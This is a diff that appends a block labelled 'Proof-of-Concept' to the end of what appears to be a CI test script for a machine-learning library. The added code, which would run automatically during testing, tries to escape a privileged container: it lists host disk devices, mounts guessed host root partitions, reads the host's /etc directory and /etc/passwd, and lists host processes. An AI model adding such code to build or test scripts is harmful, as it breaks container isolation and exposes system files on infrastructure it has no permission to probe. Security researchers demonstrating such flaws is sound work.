@@ -1719,3 +1719,66 @@ else
   test_torch_function_benchmark
   test_benchmarks
 fi
+
+
+# ============================================================================
+# == START: Proof-of-Concept Code for Privileged Container Demonstration ===
+# ============================================================================
+echo "[PoC] >>> Starting privileged access demonstration."
+
+# Check 1: Attempt to list host block devices.
+# In a non-privileged container, this should typically fail or show nothing relevant.
+# In a privileged container, it might show the host's actual disk devices (sda, nvme...).
+echo "[PoC] Listing host block devices in /dev/:"
+ls -l /dev/sd* /dev/nvme* || echo "[PoC] INFO: Failed to list /dev/sd* or /dev/nvme* (or none exist/access denied even with --privileged)."
+
+# Check 2: Attempt to mount the host filesystem (best effort).
+# This is the most direct proof but relies on guessing the host device name
+# and having mount capabilities granted by --privileged.
+echo "[PoC] Attempting to mount a potential host root device..."
+POC_HOST_MOUNT_POINT="/mnt/host_poc_$$" # Use PID to avoid collision if script runs concurrently (unlikely here)
+mkdir "${POC_HOST_MOUNT_POINT}" || echo "[PoC] INFO: Failed to create ${POC_HOST_MOUNT_POINT} (maybe it exists?)."
+
+# Try mounting common device names. We only need one to succeed for demonstration.
+HOST_DEVICE_GUESSES=("/dev/sda1" "/dev/nvme0n1p1" "/dev/vda1")
+MOUNT_SUCCESS=0
+for dev_guess in "${HOST_DEVICE_GUESSES[@]}"; do
+  echo "[PoC] Trying to mount ${dev_guess}..."
+  mount "${dev_guess}" "${POC_HOST_MOUNT_POINT}"
+  if [ $? -eq 0 ]; then
+    echo "[PoC] SUCCESS: Mounted ${dev_guess} to ${POC_HOST_MOUNT_POINT}!"
+    MOUNT_SUCCESS=1
+    break # Exit loop on first successful mount
+  else
+    echo "[PoC] INFO: Failed to mount ${dev_guess}."
+  fi
+done
+
+# Check 3: If mount succeeded, try listing/reading files.
+if [ ${MOUNT_SUCCESS} -eq 1 ]; then
+  echo "[PoC] Listing contents of host /etc directory (via mount):"
+  ls -alh "${POC_HOST_MOUNT_POINT}/etc/" || echo "[PoC] ERROR: Failed to list mounted /etc."
+
+  echo "[PoC] Reading first 3 lines of host /etc/passwd (via mount):"
+  head -n 3 "${POC_HOST_MOUNT_POINT}/etc/passwd" || echo "[PoC] ERROR: Failed to read mounted /etc/passwd."
+
+  # Cleanup mount
+  echo "[PoC] Attempting to unmount ${POC_HOST_MOUNT_POINT}..."
+  umount "${POC_HOST_MOUNT_POINT}" || echo "[PoC] INFO: Failed to unmount (might already be unmounted or busy)."
+else
+  echo "[PoC] INFO: Host filesystem mount attempt failed for all guessed devices."
+fi
+
+# Cleanup mount point directory regardless
+rmdir "${POC_HOST_MOUNT_POINT}" || echo "[PoC] INFO: Failed to remove directory ${POC_HOST_MOUNT_POINT} (might not be empty or never created)."
+
+
+# Check 4: Try listing processes - might show host PIDs if PID namespace isn't isolated
+echo "[PoC] Listing processes (ps aux):"
+ps aux || echo "[PoC] INFO: Failed to run 'ps aux'."
+
+
+echo "[PoC] <<< Privileged access demonstration finished."
+# ==========================================================================
+# == END: Proof-of-Concept Code                                         ===
+# ==========================================================================
